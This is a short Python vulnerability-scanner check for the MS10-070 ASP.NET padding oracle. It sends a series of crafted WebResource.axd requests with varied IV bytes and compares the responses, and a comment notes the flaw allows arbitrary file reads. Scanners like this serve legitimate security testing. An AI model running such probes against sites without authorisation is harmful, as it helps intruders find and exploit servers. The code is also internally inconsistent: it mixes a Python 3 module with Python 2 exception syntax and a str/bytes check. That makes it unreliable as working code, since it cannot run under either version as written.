# coding=utf-8
import base64
import urllib.request as ur

#攻击者通过此漏洞最终可以达到任意文件读取的效果。
def check(url, timeout):
    try:
        res_html = ur.urlopen(url, timeout=timeout).read()
        if 'WebResource.axd?d=' in res_html:
            error_i = 0
            bglen = 0
            for k in range(0, 255):
                IV = "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" + chr(k)
                bgstr = 'A' * 21 + '1'
                enstr = base64.b64encode(IV).replace('=', '').replace('/', '-').replace('+', '-')
                exp_url = "%s/WebResource.axd?d=%s" % (url, enstr + bgstr)
                try:
                    request = ur.Request(exp_url)
                    res = ur.urlopen(request, timeout=timeout)
                    res_html = res.read()
                    res_code = res.code
                except ur.HTTPError, e:
                    res_html = e.read()
                    res_code = e.code
                except ur.URLError, e:
                    error_i += 1
                    if error_i >= 3: return
                except:
                    return
                if int(res_code) == 200 or int(res_code) == 500:
                    if k == 0:
                        bgcode = int(res_code)
                        bglen = len(res_html)
                    else:
                        necode = int(res_code)
                        if (bgcode != necode) or (bglen != len(res_html)):
                            return u'MS10-070 ASP.NET Padding Oracle信息泄露漏洞'
                else:
                    return
    except Exception, e:
        pass
